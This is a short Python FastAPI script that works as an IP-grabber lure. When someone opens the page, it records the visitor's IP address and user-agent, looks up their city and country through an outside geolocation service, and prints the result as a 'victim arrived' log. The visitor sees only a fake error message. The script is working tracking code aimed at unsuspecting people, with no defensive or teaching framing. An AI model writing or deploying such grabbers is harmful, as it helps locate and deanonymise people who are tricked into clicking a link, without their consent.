from fastapi import FastAPI,Request
import requests
import uvicorn
import asyncio
app = FastAPI()

def get_location(ip):
    data = requests.get(f"https://ipapi.co/{ip}/json/").json()
    return data.get("country_name"),data.get("city")
@app.get("/")
async def rr(r : Request):
    ip = r.client.host
    useragent = r.headers.get("user-agent")
    c,ci = get_location(ip=ip)
    print("""
victim arrived
ip = {}
city = {}
country = {}
user-agent = {}




""".format(ip,ci,c,useragent))
    return "opsss something went wrong"
